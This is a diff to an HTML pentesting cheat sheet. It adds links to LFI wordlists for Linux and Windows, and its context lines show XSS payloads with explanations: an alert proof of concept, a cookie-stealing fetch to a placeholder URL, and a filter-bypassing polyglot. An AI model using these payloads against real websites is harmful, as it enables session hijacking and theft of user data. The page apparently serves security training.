@@ -262,7 +262,9 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
    
 	
 <h2 align='center' id='n2'><em> Payloads </em></h2>
-    <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
+<li> <a href='#n2.1'> XSS Payloads </a>
+<li> <a href='#n2.2'> LFI Linux and Windwos Payloads </a>
+    <h3 id='n2.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
     <li> <b> Proof Of Concept (PoC) </b> - <pre><code> <script>alert('Success XSS!');</script> </code></pre>
       <p> This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text "Success XSS".
     <li> <b> Session Stealing </b> - <pre><code> <script>fetch('url/steal?cookie=' + btoa(document.cookie));</script> </code></pre>
@@ -273,6 +275,11 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
       <p> This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
     <li> <b> Polyglots </b> - <pre><code> jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Success XSS!'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Success XSS!')//>\x3e </code></pre>
       <p> An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
+
+<h3 id='n2.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LFI Payloads </h3>
+	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux'> For Linux </a>
+ 	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows'> For Windows </a>
+
 
 <h3 align='right'><a href='#start'> <-- Back </a></h3>
 	      
